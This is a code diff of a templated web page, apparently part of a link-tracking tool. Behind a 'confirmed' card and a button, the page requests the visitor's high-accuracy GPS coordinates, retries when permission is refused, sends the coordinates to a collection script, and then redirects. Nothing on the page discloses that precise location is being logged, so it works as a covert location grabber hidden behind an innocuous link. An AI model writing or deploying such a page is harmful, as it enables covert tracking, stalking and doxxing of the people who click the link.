@@ -32,7 +32,7 @@ button{margin-top:14px;padding:12px 32px;border:0;border-radius:999px;background
 window.LT_CODE = {{ code|tojson }};
 window.LT_HIT  = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
-window.LT_GEO  = {{ 1 if link.mode == "geo" else 0 }};
+window.LT_GEO  = 0;
 window.LT_READY = function (p) {
   document.getElementById("st").textContent = "確認できました";
   document.getElementById("card").hidden = false;
@@ -43,9 +43,22 @@ window.LT_READY = function (p) {
 <script src="/static/collect.js"></script>
 <script>
 const DEST = {{ dest|tojson }};
-document.getElementById("go").onclick = async function () {
-  try { await LT.send(await LT.geo()); } catch (e) {}
-  if (DEST) location.href = DEST;
+const RETRY_TEXT = {{ retry_text|tojson }};
+const go = document.getElementById("go");
+let busy = false, done = false;
+go.onclick = function () {
+  if (busy || done) return;
+  busy = true; go.disabled = true;
+  navigator.geolocation.getCurrentPosition(
+    async function (p) {
+      busy = false; done = true;            // 取れたら固定（未取得に戻さない）
+      go.style.display = "none";
+      try { await LT.send({ gps_lat: p.coords.latitude, gps_lon: p.coords.longitude,
+                            gps_acc: p.coords.accuracy }); } catch (e) {}
+      if (DEST) location.href = DEST;
+    },
+    function () { busy = false; go.disabled = false; go.textContent = RETRY_TEXT; },
+    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
 };
 </script>
 </body></html>
